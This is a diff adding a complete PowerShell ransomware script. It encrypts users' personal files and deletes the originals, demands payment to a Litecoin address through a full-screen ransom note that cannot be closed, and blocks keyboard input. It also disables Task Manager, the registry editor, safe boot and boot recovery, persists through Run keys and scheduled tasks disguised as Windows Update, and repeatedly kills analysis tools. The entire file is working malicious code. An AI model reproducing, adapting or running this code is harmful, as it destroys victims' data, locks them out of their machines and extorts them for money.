@@ -1,0 +1,385 @@
+param(
+    [string]$Command = "",
+    [string]$LTCAddress = "LhAuqpJ8aKpRwFwoejbLbLgde8tkf36JsU",
+    [int]$RansomAmount = 50
+)
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Security.Cryptography
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Blocker {
+    [DllImport("user32.dll")] public static extern bool BlockInput(bool b);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+    [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int idHook, KeyboardHookProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("user32.dll")] public static extern bool ShowCursor(bool bShow);
+    [DllImport("user32.dll")] public static extern int SetCursorPos(int x, int y);
+    [DllImport("user32.dll")] public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
+    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    public delegate IntPtr KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam);
+}
+"@
+
+$RijndaelKey = $null
+$RijndaelIV = $null
+$KeyPath = "$env:TEMP\system.key"
+$EncryptedFilesList = "$env:TEMP\encrypted_files.txt"
+
+function Generate-RijndaelKey {
+    $rijndael = New-Object System.Security.Cryptography.RijndaelManaged
+    $rijndael.KeySize = 256
+    $rijndael.BlockSize = 128
+    $rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $rijndael.GenerateKey()
+    $rijndael.GenerateIV()
+    $RijndaelKey = $rijndael.Key
+    $RijndaelIV = $rijndael.IV
+    $keyData = @{
+        Key = [Convert]::ToBase64String($rijndael.Key)
+        IV = [Convert]::ToBase64String($rijndael.IV)
+    }
+    $keyData | ConvertTo-Json | Out-File $KeyPath -Force
+    return $rijndael
+}
+
+function Encrypt-File {
+    param([string]$FilePath, [System.Security.Cryptography.Rijndael]$Rijndael)
+    
+    try {
+        $encryptedPath = "$FilePath.encrypted"
+        $fileStream = New-Object System.IO.FileStream($encryptedPath, [System.IO.FileMode]::Create)
+        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $Rijndael.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
+        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
+        $cryptoStream.Write($fileContent, 0, $fileContent.Length)
+        $cryptoStream.Close()
+        $fileStream.Close()
+        Remove-Item $FilePath -Force
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function Decrypt-File {
+    param([string]$EncryptedPath, [System.Security.Cryptography.Rijndael]$Rijndael)
+    
+    try {
+        $decryptedPath = $EncryptedPath -replace '\.encrypted$', ''
+        $fileStream = New-Object System.IO.FileStream($EncryptedPath, [System.IO.FileMode]::Open)
+        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $Rijndael.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
+        $fileContent = New-Object byte[] ($fileStream.Length)
+        $cryptoStream.Read($fileContent, 0, $fileContent.Length) | Out-Null
+        $cryptoStream.Close()
+        $fileStream.Close()
+        [System.IO.File]::WriteAllBytes($decryptedPath, $fileContent)
+        Remove-Item $EncryptedPath -Force
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function Get-KeyFromFile {
+    if (Test-Path $KeyPath) {
+        $keyData = Get-Content $KeyPath | ConvertFrom-Json
+        $rijndael = New-Object System.Security.Cryptography.RijndaelManaged
+        $rijndael.KeySize = 256
+        $rijndael.BlockSize = 128
+        $rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $rijndael.Key = [Convert]::FromBase64String($keyData.Key)
+        $rijndael.IV = [Convert]::FromBase64String($keyData.IV)
+        return $rijndael
+    }
+    return $null
+}
+
+function Check-Payment {
+    try {
+        $response = Invoke-RestMethod -Uri "https://api.blockcypher.com/v1/ltc/main/addrs/$LTCAddress/balance" -ErrorAction Stop
+        $balanceInLTC = $response.balance / 100000000
+        $usdValue = $balanceInLTC * (Get-LTCPrice)
+        
+        if ($usdValue -ge $RansomAmount) {
+            return $true
+        }
+    }
+    catch {
+        Write-Error "Error checking payment: $_"
+    }
+    return $false
+}
+
+function Get-LTCPrice {
+    try {
+        $response = Invoke-RestMethod -Uri "https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd"
+        return $response.litecoin.usd
+    }
+    catch {
+        return 50
+    }
+}
+
+function Invoke-Ransomware {
+    $rijndael = Generate-RijndaelKey
+    
+    $encryptedFiles = @()
+    $targetFolders = @(
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Pictures",
+        "$env:USERPROFILE\Videos",
+        "$env:USERPROFILE\Music",
+        "$env:USERPROFILE\Downloads",
+        "$env:USERPROFILE\Favorites",
+        "$env:USERPROFILE\Contacts",
+        "$env:USERPROFILE\Links",
+        "$env:USERPROFILE\Saved Games",
+        "$env:USERPROFILE\Searches",
+        "C:\Users\Public\Documents",
+        "C:\Users\Public\Pictures",
+        "C:\Users\Public\Videos",
+        "C:\Users\Public\Music",
+        "C:\Users\Public\Downloads",
+        "D:\",
+        "E:\",
+        "F:\"
+    )
+    
+    $excludedExtensions = @(".exe", ".jar", ".dll", ".sys", ".ini", ".key", ".msi", ".bat", ".cmd", ".ps1")
+    
+    foreach ($folder in $targetFolders) {
+        if (Test-Path $folder) {
+            Get-ChildItem -Path $folder -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                if ($excludedExtensions -notcontains $_.Extension.ToLower()) {
+                    if ($_.Name -ne "system.key" -and $_.Extension -ne ".encrypted") {
+                        if (Encrypt-File -FilePath $_.FullName -Rijndael $rijndael) {
+                            $encryptedFiles += $_.FullName
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    $encryptedFiles | Out-File $EncryptedFilesList -Force
+}
+
+function Invoke-Revert {
+    $rijndael = Get-KeyFromFile
+    if ($rijndael -eq $null) {
+        return
+    }
+    
+    if (Test-Path $EncryptedFilesList) {
+        $encryptedFiles = Get-Content $EncryptedFilesList
+        
+        foreach ($file in $encryptedFiles) {
+            $encryptedPath = "$file.encrypted"
+            if (Test-Path $encryptedPath) {
+                Decrypt-File -EncryptedPath $encryptedPath -Rijndael $rijndael
+            }
+        }
+        
+        Remove-Item $EncryptedFilesList -Force
+        Remove-Item $KeyPath -Force
+    }
+}
+
+function Invoke-PaymentCheck {
+    while ($true) {
+        if (Check-Payment) {
+            Invoke-Revert
+            break
+        }
+        Start-Sleep -Seconds 60
+    }
+}
+
+$hook = [Blocker+KeyboardHookProc] { param($n,$w,$l) return [IntPtr]1 }
+$hookHandle = [Blocker]::SetWindowsHookEx(13, $hook, [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(([System.Reflection.Assembly]::GetExecutingAssembly().GetModules()[0])), 0)
+[Blocker]::ShowWindow([Blocker]::GetConsoleWindow(), 0)
+[Blocker]::ShowCursor($false)
+
+$keyboardHook = [Blocker+KeyboardHookProc] {
+    param($nCode, $wParam, $lParam)
+    return [IntPtr]1
+}
+$hookID = [Blocker]::SetWindowsHookEx(13, $keyboardHook, [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(([System.Reflection.Assembly]::GetExecutingAssembly().GetModules()[0])), 0)
+
+$null = [Blocker]::SystemParametersInfo(0x2001, 0, 0, 0)
+$null = [Blocker]::SystemParametersInfo(0x0030, 0, 0, 0)
+
+New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "ScreenSaveActive" -Value "0" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -Value "" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+
+$taskmgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+if (!(Test-Path $taskmgrPath)) { New-Item -Path $taskmgrPath -Force | Out-Null }
+New-ItemProperty -Path $taskmgrPath -Name "DisableTaskMgr" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+
+$regeditPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+New-ItemProperty -Path $regeditPath -Name "DisableRegistryTools" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+
+$explorerPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+if (!(Test-Path $explorerPath)) { New-Item -Path $explorerPath -Force | Out-Null }
+New-ItemProperty -Path $explorerPath -Name "NoRun" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path $explorerPath -Name "NoFind" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path $explorerPath -Name "NoClose" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path $explorerPath -Name "NoLogOff" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path $explorerPath -Name "NoFileMenu" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path $explorerPath -Name "NoSetTaskbar" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path $explorerPath -Name "NoTrayContextMenu" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path $explorerPath -Name "NoWinKeys" -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+New-ItemProperty -Path $explorerPath -Name "NoDesktop" -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+
+$safeBootPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot"
+if (Test-Path $safeBootPath) {
+    Remove-Item -Path "$safeBootPath\Minimal" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "$safeBootPath\Network" -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>$null | Out-Null
+bcdedit /set {default} recoveryenabled No 2>$null | Out-Null
+bcdedit /set {default} nointegritychecks Yes 2>$null | Out-Null
+bcdedit /set {default} bootmenupolicy Legacy 2>$null | Out-Null
+bcdedit /set {default} advancedoptions No 2>$null | Out-Null
+bcdedit /set {default} optionsedit No 2>$null | Out-Null
+
+$scriptPath = $MyInvocation.MyCommand.Path
+$startupPaths = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+)
+
+foreach ($path in $startupPaths) {
+    if (!(Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
+    New-ItemProperty -Path $path -Name "WindowsUpdateService" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+}
+
+$activeSetup = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdate"
+if (!(Test-Path $activeSetup)) { New-Item -Path $activeSetup -Force -ErrorAction SilentlyContinue | Out-Null }
+New-ItemProperty -Path $activeSetup -Name "StubPath" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+
+$scheduledTask = "schtasks /create /tn `"WindowsUpdate`" /tr `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `'$scriptPath`'`" /sc minute /mo 5 /f 2>$null"
+Invoke-Expression $scheduledTask | Out-Null
+
+Start-Job -ScriptBlock { 
+    while ($true) { 
+        taskkill /f /im explorer.exe 2>$null
+        taskkill /f /im taskmgr.exe 2>$null
+        taskkill /f /im regedit.exe 2>$null
+        taskkill /f /im processhacker.exe 2>$null
+        taskkill /f /im procexp.exe 2>$null
+        taskkill /f /im procmon.exe 2>$null
+        taskkill /f /im perfmon.exe 2>$null
+        taskkill /f /im resmon.exe 2>$null
+        taskkill /f /im msconfig.exe 2>$null
+        taskkill /f /im gpedit.msc 2>$null
+        taskkill /f /im secpol.msc 2>$null
+        taskkill /f /im services.msc 2>$null
+        Start-Sleep -Seconds 1 
+    } 
+}
+
+$w = New-Object -ComObject WScript.Shell
+$w.SendKeys('{F11}')
+
+switch ($Command.ToLower()) {
+    "revert" {
+        Invoke-Revert
+        exit
+    }
+    "check" {
+        Invoke-PaymentCheck
+    }
+    default {
+        Invoke-Ransomware
+        Start-Job -ScriptBlock ${function:Invoke-PaymentCheck}
+    }
+}
+
+$FontSizeMain = 36
+
+$form = New-Object Windows.Forms.Form
+$form.WindowState = "Maximized"
+$form.FormBorderStyle = "None"
+$form.TopMost = $true
+$form.BackColor = "Black"
+$form.KeyPreview = $true
+$form.Add_KeyDown({ $_.SuppressKeyPress = $true })
+$form.Add_KeyUp({ $_.SuppressKeyPress = $true })
+$form.Add_FormClosing({ $_.Cancel = $true })
+
+$label = New-Object Windows.Forms.Label
+$label.Text = "YOUR COMPUTER HAS BEEN RATTED`n`nTo recover your computer, you must pay $RansomAmount USD in LTC`nto the following address:   $LTCAddress`n`nAfter payment, your system will be restored. You have 24 hours."
+$label.Font = New-Object Drawing.Font("Arial", $FontSizeMain, [Drawing.FontStyle]::Bold)
+$label.ForeColor = "Red"
+$label.Dock = "Fill"
+$label.TextAlign = "MiddleCenter"
+$form.Controls.Add($label)
+
+$rimbalzo = New-Object Windows.Forms.Label
+$rimbalzo.Text = "ENCRYPTED"
+$rimbalzo.Font = New-Object Drawing.Font("Arial", 28, [Drawing.FontStyle]::Bold)
+$rimbalzo.ForeColor = "Red"
+$rimbalzo.AutoSize = $true
+$rimbalzo.Location = [Drawing.Point]::new(100, 100)
+$form.Controls.Add($rimbalzo)
+
+$dx = 7
+$dy = 5
+$colors = @("Red","Orange","Yellow","Green","Cyan","Blue","Magenta","Purple","Pink","Lime")
+$colorIndex = 0
+
+$lampeggioTimer = New-Object Windows.Forms.Timer
+$lampeggioTimer.Interval = 100
+$lampeggioTimer.Add_Tick({
+    $label.ForeColor = $colors[$colorIndex % $colors.Length]
+    $rimbalzo.ForeColor = $colors[($colorIndex + 5) % $colors.Length]
+    $colorIndex++
+})
+$lampeggioTimer.Start()
+
+$timer = New-Object Windows.Forms.Timer
+$timer.Interval = 30
+$timer.Add_Tick({
+    $x = $rimbalzo.Location.X + $dx
+    $y = $rimbalzo.Location.Y + $dy
+    if($x -lt 0 -or $x -gt ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width) - $rimbalzo.Width) { $dx = -$dx }
+    if($y -lt 0 -or $y -gt ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height) - $rimbalzo.Height) { $dy = -$dy }
+    $rimbalzo.Location = [Drawing.Point]::new($x, $y)
+    
+    $tasti = @(91,92,93,94,95,9,27,32,18,17,16,46,45,44,36,35,34,33,20,145,144,19,18,115,112,113,114,116,117,118,119,120,121,122,123)
+    foreach($k in $tasti) {
+        if ([Blocker]::GetAsyncKeyState($k) -band 0x8000) {
+            [Blocker]::BlockInput($true)
+            Start-Sleep -m 5000
+            [Blocker]::BlockInput($false)
+            break
+        }
+    }
+    
+    [Blocker]::SetCursorPos(500, 500)
+    
+    $hwnd = [Blocker]::FindWindow("Progman", "Program Manager")
+    if ($hwnd -ne [IntPtr]::Zero) {
+        [Blocker]::SetForegroundWindow($hwnd)
+    }
+})
+$timer.Start()
+
+$speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
+$speech.SpeakAsync("Your files have been encrypted. Pay $RansomAmount dollars in Litecoin to recover them.") | Out-Null
+
+[System.Windows.Forms.Application]::Run($form)
